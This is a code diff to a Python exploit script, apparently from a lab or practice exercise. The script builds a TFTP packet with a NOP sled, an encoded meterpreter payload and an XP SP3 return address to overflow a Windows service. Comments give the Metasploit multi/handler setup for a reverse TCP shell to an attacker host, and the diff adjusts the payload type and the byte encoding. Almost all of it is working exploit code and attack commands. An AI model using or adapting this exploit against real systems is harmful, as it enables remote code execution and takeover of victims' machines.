@@ -8,7 +8,7 @@ import sys, socket, binascii, subprocess, os
 ## Using meterpreter for initial payload, run this prior to this python file
 ## sudo msfconsole
 ## use multi/handler
-## set payload windows/meterpreter/reverse_tcp
+## set payload windows/meterpreter/reverse_nonx_tcp
 ## set LHOST <Attacker IP>
 ## set LPORT 443
 ## exploit -j
@@ -28,7 +28,7 @@ lhostHex = binascii.a2b_hex(lhostSplit[0]) + binascii.a2b_hex(lhostSplit[1]) +bi
 exploit = ""
 
 ret = "\x53\x93\x42\x7e" # return address for XPSP3, little endian
-nop = "\x90" * (25-len(lhostHex)) # calc NOP sled size
+nop = "\x90" * (25-len(lhost)) # calc NOP sled size
 
 ## need small payload (<210) but unlike writeup, not a meterpreter shell.  Let's do meterpreter first to validate
 ## that everything is working and then replace payload.  need to use msfvenom instead of msfpayload.
@@ -102,13 +102,12 @@ while x < len(encodedPL)-1:
         x = x+2
         break
     else:
-        print x
-        print '\\x' + encodedPL[x] +encodedPL[x+1]
-        epl += '\\x' + encodedPL[x] +encodedPL[x+1]
+        epl += binascii.a2b_hex(encodedPL[x] +encodedPL[x+1])
+        #epl += '\\x' + encodedPL[x] +encodedPL[x+1]
         x = x+2
 
 exploit = "\x00\x02" + nop + epl + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
-
+#print exploit
 ## create socket and send
 
 print "Sending payload"
